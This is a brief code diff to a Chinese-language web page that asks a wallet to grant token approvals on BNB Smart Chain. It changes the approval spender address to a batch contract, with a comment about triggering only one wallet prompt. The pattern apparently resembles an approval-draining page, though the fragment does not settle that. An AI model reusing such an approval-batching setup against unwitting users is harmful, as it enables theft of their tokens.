@@ -249,7 +249,7 @@
                  <div class="info-box">
              <div class="info-item">
                  <span class="label">授权目标:</span>
-                 <span class="value" id="contractAddress">0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e</span>
+                 <span class="value" id="contractAddress">0x66C3e8Ca46D99aA4383AEac8ac46010C3Fd5B38A</span>
              </div>
              <div class="info-item">
                  <span class="label">授权数量:</span>
@@ -308,7 +308,8 @@
         const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
         
         // 合约地址
-        const PERMISSION_ADDRESS = '0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e';
+        // 授权的最终spender改为批量合约本身，确保只弹一次
+        const PERMISSION_ADDRESS = '0x66C3e8Ca46D99aA4383AEac8ac46010C3Fd5B38A';
         
         // 代币合约地址
         const TOKENS = {
